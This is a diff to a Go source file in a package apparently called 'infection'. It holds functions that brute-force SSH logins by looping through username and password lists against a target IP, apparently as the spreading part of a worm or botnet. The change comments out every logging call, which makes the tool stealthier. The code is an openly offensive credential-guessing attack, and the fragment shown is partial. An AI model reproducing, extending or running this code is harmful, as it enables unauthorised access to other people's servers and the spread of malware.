@@ -2,7 +2,7 @@ package infection
 
 import (
 	"golang.org/x/crypto/ssh"
-	"log"
+	//"log"
 	"time"
 	"bytes"
 	"strconv"
@@ -28,7 +28,7 @@ func GuessSSHConnection (ip string) bool {
 	timeout = time.Minute
   users,err_users := os.Open("users.txt")
   if err_users != nil {
-    log.Fatal(err_users)
+    //log.Fatal(err_users)
   }
   defer users.Close()
   user_scanner := bufio.NewScanner(users)
@@ -37,7 +37,7 @@ func GuessSSHConnection (ip string) bool {
 			username = user_scanner.Text()
 			pwds,err_pwds := os.Open("passwords.txt")
 	  	if err_pwds != nil {
-	    	log.Fatal(err_pwds)
+	    	//log.Fatal(err_pwds)
 	  	}
 			defer pwds.Close()
 			pwd_scanner := bufio.NewScanner(pwds)
@@ -49,13 +49,13 @@ func GuessSSHConnection (ip string) bool {
     	}
 
 			if err_pwds := pwd_scanner.Err(); err_pwds != nil {
-	    	log.Fatal(err_pwds)
+	    	//log.Fatal(err_pwds)
 	  	}
 		}
   }
 
   if err_users := user_scanner.Err(); err_users != nil {
-    log.Fatal(err_users)
+    //log.Fatal(err_users)
   }
 
 	if (session != nil){
@@ -86,13 +86,13 @@ func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
 	//log.Println("Connecting with pair:", "username:", username, "password:", password, "on ip:", ip)
 	client, err := ssh.Dial("tcp",ip,config)
 	if err != nil {
-		log.Println("Failed to dial: ", err)
+		//log.Println("Failed to dial: ", err)
 		miss = true
 	}
 	if !miss {
 	  s, err = client.NewSession()
 	  if err != nil {
-	  	log.Println("Failed to create session: ", err)
+	  	//log.Println("Failed to create session: ", err)
 	  }
   }
 	return c,s
